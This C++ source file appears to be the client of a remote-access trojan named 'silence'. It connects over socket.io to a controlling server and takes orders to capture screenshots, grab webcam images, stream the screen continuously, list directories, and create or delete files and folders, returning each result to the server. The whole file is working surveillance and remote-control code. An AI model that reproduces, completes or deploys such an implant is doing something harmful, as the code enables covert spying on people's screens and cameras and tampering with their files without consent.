#include <Client.h>

#define SIOSTR(str) sio::string_message::create(str)
#define SIOBOOL(boolean) sio::bool_message::create(boolean)
#define SIOBIN(bin) sio::binary_message::create(bin)

namespace silence
{
    Client::Client(const std::string &url)
        : mUrl(url), mIO(new sio::client())
    {
        using namespace std::placeholders;
        mSocket = mIO->socket();

        // bind events
        mSocket->on("command", std::bind(&Client::onCommand,
                                         this, _1, _2, _3, _4));

        mIO->set_socket_open_listener(std::bind(&Client::onConnected, this, _1));
        mIO->set_close_listener(std::bind(&Client::onClosed, this, _1));
        mIO->set_fail_listener(std::bind(&Client::onFailed, this));
    }

    Client::~Client()
    {
        mSocket->off_all();
        mSocket->off_error();

        mLock.lock();
        mCond.notify_all();
        mLock.unlock();
    }

    void Client::connect()
    {
        mIO->connect(mUrl);
        mLock.lock();
        mCond.wait(mLock);
        mLock.unlock();
    }

    void Client::onConnected(const std::string &nsp)
    {
        std::cout << "Connected with server on nsp: " << nsp << std::endl;
    }

    void Client::onFailed()
    {
        std::cout << "sio failed" << std::endl;
    }

    void Client::onClosed(sio::client::close_reason const &reason)
    {
        std::cout << reason << std::endl;
        std::cout << "sio closed" << std::endl;
    }

    sio::message::list
    Client::createObject(const CommandObject &object)
    {
        auto obj = sio::object_message::create();
        obj.get()->get_map() = object;
        return obj;
    }

    template <typename T, typename... Args>
    void Client::launchEvent(const std::function<T> &callable,
                             Args &&...args)
    {
        std::thread thread{callable, args...};
        thread.detach();
    }

    void Client::sendResponse(bool variable, const std::string &event,
                              const std::string &errorMsg,
                              const std::string &infoMsg)
    {
        if (!variable)
            error(event, errorMsg);
        else
            info(infoMsg);
    }

    void Client::onCommand(std::string const &name,
                           sio::message::ptr const &data,
                           bool hasAck,
                           sio::message::list &ack_resp)
    {
        using namespace std::placeholders;
        auto commandObject = data->get_map();
        std::string event = commandObject["event"]->get_string();

        if (event == "greet")
            greetEvent();
        else if (event == "start_stream")
            launchEvent<void()>(std::bind(&Client::startStreamEvent, this)); // launch in new thread
        else if (event == "kill_stream")
            killStreamEvent();
        else if (event == "screenshot")
            screenshotEvent();
        else if (event == "webcamshot")
            webcamShotEvent();
        else if (event == "listdir")
            listDirEvent(commandObject);
        else if (event == "mkdir")
            mkDirEvent(commandObject);
        else if (event == "remove")
            removeEvent(commandObject);
        else
            error(event, "Unknown event");
    }

    void Client::greetEvent()
    {
        mSocket->emit("add_client",
                      createObject({{"hostname", SIOSTR("hostname")},
                                    {"username", SIOSTR("username")}}));
    }

    void Client::screenshotEvent()
    {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        response("screenshot",
                 SIOBIN(impl::toBinaryString(image)));
    }

    void Client::webcamShotEvent()
    {
        try
        {
            cv::VideoCapture camera;
            cv::Mat image;

            camera.read(image);
            response("webcamshot",
                     SIOBIN(impl::toBinaryString(image)));
        }
        catch (cv::Exception &)
        {
            error("webcamshot", "No camera found");
        }
    }

    void Client::killStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);

        if (!mStreamRunning)
        {
            error("kill_stream", "Stream is not running");
            return;
        }

        mStreamRunning = false;
        response("kill_stream",
                 SIOBOOL(true));
    }

    void Client::startStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
        mStreamRunning = true;
        lockGuard.unlock();

        impl::Screenshot screen;
        while (true)
        {
            lockGuard.lock();
            if (!mStreamRunning)
                return;
            lockGuard.unlock();

            cv::Mat image{screen.take()};
            mSocket->emit("frame",
                          impl::toBinaryString(image));
        }
    }

    void Client::listDirEvent(const CommandObject &object)
    {
        auto dirList = sio::array_message::create();
        for (const auto &entry : fs::directory_iterator(object.at("path")->get_string()))
            dirList->get_vector().push_back(sio::string_message::create(entry.path()));

        response("listdir", dirList);
    }

    void Client::mkDirEvent(const CommandObject &object)
    {
        response("mkdir",
                 SIOBOOL(fs::create_directories(object.at("path")->get_string())));
    }

    void Client::removeEvent(const CommandObject &object)
    {
        response("remove",
                 SIOBOOL(fs::remove(object.at("path")->get_string())));
    }

    void Client::error(const std::string &event, const std::string &msg)
    {
        mSocket->emit("error", createObject({{"event", SIOSTR(event)},
                                             {"msg", SIOSTR(msg)}}));
    }

    void Client::info(const std::string &info)
    {
        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
    }

    void Client::response(const std::string &event, const sio::message::list &msg)
    {
        mSocket->emit("response", createObject({{"event", SIOSTR(event)},
                                                {"data", msg[0]}}));
    }
}